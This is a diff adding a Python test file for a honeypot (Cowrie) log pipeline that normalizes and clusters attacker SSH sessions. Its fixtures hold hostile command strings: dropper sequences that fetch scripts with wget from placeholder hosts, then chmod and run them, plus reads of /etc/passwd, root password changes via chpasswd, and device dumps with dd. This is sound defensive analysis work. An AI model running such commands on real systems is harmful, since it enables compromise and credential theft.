@@ -1,0 +1,107 @@
+from contextlib import closing, redirect_stdout
+import io
+import json
+from pathlib import Path
+import sqlite3
+import tempfile
+import unittest
+
+import ingest
+from ml.cluster import TEST_IP, assign, fit, normalize_part, normalize_session, split_command
+
+
+class NormalizeTests(unittest.TestCase):
+    def test_split_keeps_pipe(self):
+        self.assertEqual(split_command('cd /tmp; ls -la && uname -a || id | grep x'),
+                         ['cd /tmp', 'ls -la', 'uname -a', 'id | grep x'])
+        self.assertEqual(split_command('rm -rf a\n\n/bin/busybox wget x\r\nsh x'),
+                         ['rm -rf a', '/bin/busybox wget x', 'sh x'])
+
+    def test_examples(self):
+        cases = {
+            'wget http://1.2.3.4:8080/bins/x86 -O /tmp/x': 'wget <URL> -O /tmp/x',
+            'echo "root:Pa55w0rd!"|chpasswd': 'echo "root:<PASS>"|chpasswd',
+            'ssh root@10.0.0.1:22': 'ssh root@<IP>',
+            'echo ' + 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFD' + ' | base64 -d':
+                'echo <B64> | base64 -d',
+            'echo deadbeefcafebabe1234 > /tmp/k': 'echo <HEX> > /tmp/k',
+            'chmod 777 /tmp/a8sd9f7Q2x': 'chmod <NUM> /tmp/<FILE>',
+            'cat   /proc/cpuinfo |  head -n 1': 'cat /proc/cpuinfo | head -n <NUM>',
+            'uname -m 2>&1': 'uname -m 2>&1',
+            # 장치·커널 경로는 <FILE>로 바꾸지 않는다
+            'dd if=/dev/mmcblk0p1 of=/tmp/x': 'dd if=/dev/mmcblk0p1 of=/tmp/x',
+            'cat /dev/mtdblock0': 'cat /dev/mtdblock0',
+            'ls /sys/class/net/enp0s31f6': 'ls /sys/class/net/enp0s31f6',
+            # '/'로 시작하는 긴 경로는 <B64>로 삼키지 않는다
+            'cat /var/lib/docker/AbCdEf1234567890GhIjKl1234567890MnOpQr/x':
+                'cat /var/lib/docker/<FILE>/x',
+        }
+        for raw, expected in cases.items():
+            with self.subTest(raw=raw):
+                self.assertEqual(normalize_part(raw), expected)
+
+    def test_downloaded_file_name_in_same_session(self):
+        cmds = ['cd /tmp; wget http://evil.invalid/bins.sh', 'chmod +x bins.sh; sh ./bins.sh']
+        self.assertEqual(normalize_session(cmds),
+                         ('cd /tmp', 'wget <URL>', 'chmod +x <FILE>', 'sh ./<FILE>'))
+        # 다른 세션에서는 같은 이름이라도 바꾸지 않는다
+        self.assertEqual(normalize_session(['sh bins.sh']), ('sh bins.sh',))
+
+
+def event(sid, ip, eventid, ts, **extra):
+    return {'session': sid, 'src_ip': ip, 'eventid': eventid, 'sensor': 'syd',
+            'timestamp': f'2026-10-28T00:00:{ts:02d}Z', **extra}
+
+
+RECON = ['uname -a', 'cat /etc/passwd; echo {i}']
+DROPPER = ['cd /tmp; wget http://198.51.100.{i}/x{i}.sh', 'chmod +x x{i}.sh; sh x{i}.sh']
+
+
+def attack(sid, ip, cmds, i):
+    return [event(sid, ip, 'cowrie.session.connect', 0, protocol='ssh')] + [
+        event(sid, ip, 'cowrie.command.input', j + 1, input=c.format(i=i)) for j, c in enumerate(cmds)]
+
+
+def ingest_events(con, tmp, name, events):
+    log = Path(tmp, 'syd', name)
+    log.parent.mkdir(exist_ok=True)
+    log.write_text('\n'.join(json.dumps(e) for e in events), encoding='utf-8')
+    ingest.save(con, 'syd', *ingest.collect(log)[:4])
+
+
+class PipelineTests(unittest.TestCase):
+    def test_fit_then_assign(self):
+        events = []
+        for i in range(15):
+            events += attack(f'recon{i:02d}', f'203.0.113.{i}', RECON, i)
+            events += attack(f'drop{i:02d}', f'203.0.113.{100 + i}', DROPPER, i)
+        events += attack('mine', TEST_IP, RECON, 0)
+        events += [event('noproto', '198.51.100.9', 'cowrie.command.input', 1, input='uname -a')]
+        with tempfile.TemporaryDirectory() as tmp, closing(sqlite3.connect(Path(tmp, 'h.db'))) as con:
+            con.executescript(ingest.SCHEMA)
+            ingest_events(con, tmp, 'cowrie.json', events)
+            out, models = Path(tmp, 'out'), Path(tmp, 'models')
+            with redirect_stdout(io.StringIO()):
+                fit(con, out, models)
+            fitted = dict(con.execute('SELECT session_id, cluster_id FROM ml_clusters'))
+            self.assertEqual(set(fitted), {f'{p}{i:02d}' for p in ('recon', 'drop') for i in range(15)})
+            self.assertEqual({fitted['recon00'], fitted['drop00']}, {0, 1})
+            self.assertTrue(Path(models, 'ssh.joblib').exists())
+
+            # 새 세션 하나만 저장된 모델로 배정되고 테스트 IP 세션은 여전히 빠진다
+            ingest_events(con, tmp, 'cowrie.json.1', attack('newdrop', '192.0.2.7', DROPPER, 77)
+                          + attack('mine2', TEST_IP, DROPPER, 1))
+            with redirect_stdout(io.StringIO()):
+                assign(con, out, models)
+            rows = {sid: (c, by) for sid, c, by in con.execute(
+                'SELECT session_id, cluster_id, assigned_by FROM ml_clusters')}
+            self.assertEqual(rows['newdrop'], (fitted['drop00'], 'assign'))
+            self.assertNotIn('mine', rows)
+            self.assertNotIn('mine2', rows)
+            for name in ('session_clusters.csv', 'cluster_summary.csv', 'novel_candidates.csv',
+                         'comparison.csv', 'hdbscan_selection.md'):
+                self.assertTrue(Path(out, name).exists(), name)
+
+
+if __name__ == '__main__':
+    unittest.main()
